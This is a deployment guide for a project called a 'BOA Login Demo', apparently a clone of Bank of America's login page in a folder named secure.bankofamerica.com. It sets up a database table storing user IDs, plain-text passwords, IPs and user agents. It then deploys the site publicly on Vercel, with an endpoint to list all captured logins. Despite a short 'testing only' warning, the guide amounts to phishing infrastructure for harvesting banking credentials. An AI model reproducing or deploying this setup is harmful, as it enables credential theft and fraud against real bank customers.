# Deployment Guide

This guide covers deploying the BOA Login Demo to GitHub, Vercel, and Supabase.

## Prerequisites

- GitHub account
- Vercel account
- Supabase account

## Step 1: Set Up Supabase (Cloud Database)

1. Go to [Supabase](https://supabase.com) and create an account
2. Create a new project
3. In your Supabase project dashboard:
   - Go to **SQL Editor** → **New Query**
   - Run this SQL to create the login_attempts table:

```sql
CREATE TABLE login_attempts (
  id BIGSERIAL PRIMARY KEY,
  user_id TEXT,
  password TEXT,
  remember_me BOOLEAN DEFAULT false,
  ip_address TEXT,
  user_agent TEXT,
  status TEXT DEFAULT 'Attempted',
  created_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);

-- Create index for faster queries
CREATE INDEX idx_login_attempts_created_at ON login_attempts(created_at DESC);
```

4. Get your credentials from **Settings** → **API**:
   - Copy `Project URL` (SUPABASE_URL)
   - Copy `anon` key (SUPABASE_ANON_KEY)

## Step 2: Push to GitHub

1. Create a new repository on [GitHub](https://github.com/new)
   - Repository name: `boa-login-demo` (or your choice)
   - Make it **Public** or **Private**

2. In the project directory, add the remote and push:

```bash
cd "e:\Websites\Pop-up\BOA2\secure.bankofamerica.com"
git add .
git commit -m "Initial commit: BOA login demo with Supabase integration"
git branch -M main
git remote add origin https://github.com/YOUR_USERNAME/boa-login-demo.git
git push -u origin main
```

## Step 3: Deploy to Vercel

1. Go to [Vercel Dashboard](https://vercel.com/dashboard)
2. Click **Add New** → **Project**
3. Select **Import Git Repository**
4. Enter your GitHub repo URL and import
5. In **Environment Variables**, add:
   - `SUPABASE_URL`: Your Supabase project URL
   - `SUPABASE_ANON_KEY`: Your Supabase anonymous key
   - `NODE_ENV`: `production`

6. Click **Deploy**
7. After deployment completes, your app will be live at `https://<project-name>.vercel.app`

## Step 4: Verify Deployment

1. Visit your Vercel deployment URL
2. Test the login form with test credentials
3. Check that entries appear in Supabase:
   - Go to Supabase → **Table Editor**
   - View the `login_attempts` table to see captured entries

## Environment Variables

Your `.env` file should contain:

```
SUPABASE_URL=https://your-project.supabase.co
SUPABASE_ANON_KEY=your-anon-key
NODE_ENV=production
```

## Local Development

To test locally before deployment:

1. Copy `.env.example` to `.env`
2. Add your Supabase credentials
3. Install dependencies: `npm install`
4. Start server: `npm start`
5. Open `http://localhost:3000`

## API Endpoints

- **POST /api/login** - Submit login attempt (captured and logged)
- **GET /api/logs** - View all captured login attempts

## Data Flow

```
Browser Form
    ↓
form-logger.js (Frontend)
    ↓
Node.js Server (server.js)
    ↓
Supabase Database (login_attempts table)
```

## Troubleshooting

### Supabase not receiving data:
- Check that SUPABASE_URL and SUPABASE_ANON_KEY are correct
- Verify table `login_attempts` exists in Supabase
- Check browser console for errors

### Vercel deployment fails:
- Ensure all dependencies are in `package.json`
- Check that environment variables are set in Vercel dashboard
- Review Vercel logs for error messages

### Form not submitting:
- Verify the Node.js server is running
- Check browser Network tab for API errors
- Ensure CORS is not blocking requests

## Security Notes

⚠️ **WARNING**: This demo captures plain-text passwords for testing purposes only. 
Never use this in production without:
- HTTPS/TLS encryption
- Password hashing (bcrypt, argon2, etc.)
- Proper authentication mechanisms
- Input validation and sanitization
- Rate limiting
- Security audit

## Support

For Supabase issues: [Supabase Documentation](https://supabase.com/docs)
For Vercel issues: [Vercel Documentation](https://vercel.com/docs)
For GitHub issues: [GitHub Help](https://docs.github.com)
